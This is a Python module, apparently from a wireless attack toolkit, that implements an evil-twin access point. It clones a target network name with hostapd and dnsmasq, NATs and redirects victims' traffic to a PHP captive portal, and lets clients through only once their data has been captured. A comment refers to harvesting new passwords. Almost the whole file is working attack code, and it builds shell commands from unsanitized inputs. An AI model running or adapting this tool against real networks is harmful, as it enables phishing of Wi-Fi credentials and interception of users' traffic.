import os, sys
from time import sleep
import subprocess
from threading import Thread

from wapa_db import WapaDatabase

class WAPAEvilTwin:
    def __init__(self):
        self.stop_eviltwin_execution = False
        self.running_et_cp = []

    def dnsmasq_config(self, interface):
        f = open("/var/lib/wapa/eviltwin/dnsmasq.conf", "w")
        f.write(f"interface={interface}\n")
        f.write("dhcp-range=192.168.20.2,192.168.20.200,255.255.255.0,12h\n")
        f.write("domain=wlan\n")
        f.close()

    def hostapd_config(self, interface, channel, essid, ap_password):
        f = open("/var/lib/wapa/eviltwin/hostapd.conf", "w")
        f.write(f"interface={interface}\n")
        f.write(f"channel={channel}\n")
        f.write(f"ssid={essid}\n")
        f.write("driver=nl80211\n")
        f.write("hw_mode=g\n")
        if ap_password is not None:
            f.write("country_code=US\n")
            f.write("macaddr_acl=0\n")
            f.write("auth_algs=1\n")
            f.write("ignore_broadcast_ssid=0\n")
            f.write("wpa=2\n")
            f.write(f"wpa_passphrase={ap_password}\n")
            f.write("wpa_key_mgmt=WPA-PSK\n")
            f.write("wpa_pairwise=TKIP\n")
            f.write("rsn_pairwise=CCMP\n")
        f.close()
    
    def system_config(self, interface, exit_interface):
        ip_forwarding_cmd = 'echo "net.ipv4.ip_forward=1" > /etc/sysctl.d/routed-ap.conf &>/dev/null'
        iptables_masquerade_cmd = "iptables -t nat -A POSTROUTING -o " + str(exit_interface) + " -j MASQUERADE &>/dev/null"
        unblock_interface_cmd = "rfkill unblock wlan &>/dev/null"
        ifconfig_cmd = "ifconfig " + str(interface) + " up 192.168.20.1"
        os.system(ip_forwarding_cmd)
        os.system(iptables_masquerade_cmd)
        os.system(unblock_interface_cmd)
        os.system(ifconfig_cmd)

    def generate_captive_portal(self, path):
        os.system(f"php -S 192.168.20.1:80 -t {path} > /dev/null 2>&1 &")

    def authorize_clients(self):
        while not self.stop_eviltwin_execution:
            os.system("cat /srv/wapa_data/data.txt 2>/dev/null | grep ip | awk '{print $3}' | tr '\n' ' ' > /var/lib/misc/leases.txt") # srv wapa_data contains the data extracted from hostapd and dnsmasq leases
            ipcount_cmd = "cat /var/lib/misc/leases.txt | wc -w"
            ipcount = int(subprocess.check_output(ipcount_cmd,shell=True,text=True))
            ipcount2_cmd = "cat /var/lib/misc/ipcount2.txt"
            ipcount2 = int(subprocess.check_output(ipcount2_cmd,shell=True,text=True))
            x = 0
            if ipcount > ipcount2:
                os.system("iptables -t nat -F PREROUTING > /dev/null 2>&1")
                while x < ipcount:
                    x += 1
                    acceptip_cmd = ("cat /var/lib/misc/leases.txt | awk '{print $%s}'"% x)
                    ip_to_accept_spr = str(subprocess.check_output(acceptip_cmd,shell=True,text=True))
                    ip_to_accept = ip_to_accept_spr[0:-1]
                    os.system(f"iptables -t nat -A PREROUTING -s {ip_to_accept} -j ACCEPT")
                os.system("iptables -t nat -A PREROUTING -p tcp -j DNAT --to-destination 192.168.20.1:80")
            os.system(f"echo {ipcount} > /var/lib/misc/ipcount2.txt")
            sleep(1)
    
    def start_eviltwin(self, interface, exit_interface, channel, essid, ap_password, webserver_path):
        # configure files
        wapadb = WapaDatabase()
        wapadb.swap_mode_to_master(interface)
        self.dnsmasq_config(interface=interface)
        self.hostapd_config(interface=interface, channel=channel, essid=essid, ap_password=ap_password)
        # start services (dnsmasq, hostapd and iptables)
        self.system_config(interface=interface, exit_interface=exit_interface)
        os.system("hostapd /var/lib/wapa/eviltwin/hostapd.conf > /dev/null 2>&1 &")
        os.system("dnsmasq -C /var/lib/wapa/eviltwin/dnsmasq.conf -d > /dev/null 2>&1 &")
        if webserver_path is not None:
            os.system("iptables -t nat -A PREROUTING -p tcp -j DNAT --to-destination 192.168.20.1:80")
            captive_portal_thread = Thread(target=self.generate_captive_portal, args=(webserver_path,))
            captive_portal_thread.start()
            os.system("echo 0 > /var/lib/misc/ipcount2.txt")
            autoauth = Thread(target=self.authorize_clients, name="autoauth_thread_name")
            autoauth.start()
            self.running_et_cp.append(autoauth)
        # db thread that checks for new passwords...

    def stop_eviltwin(self, interface):
        self.stop_eviltwin_execution = True
        print("[*] Restoring system configuration")
        if len(self.running_et_cp) > 0:
            for thread in self.running_et_cp:
                thread.join()
        os.system("killall hostapd dnsmasq > /dev/null 2>&1 &")
        os.system("iptables -t nat -F PREROUTING > /dev/null 2>&1")
        os.system("iptables -t nat -F POSTROUTING > /dev/null 2>&1")
        os.system(f"ifconfig {interface} up 0.0.0.0")
        wapadb = WapaDatabase()
        wapadb.swap_mode_to_managed(interface)
        sleep(2.5)
        self.stop_eviltwin_execution = False

        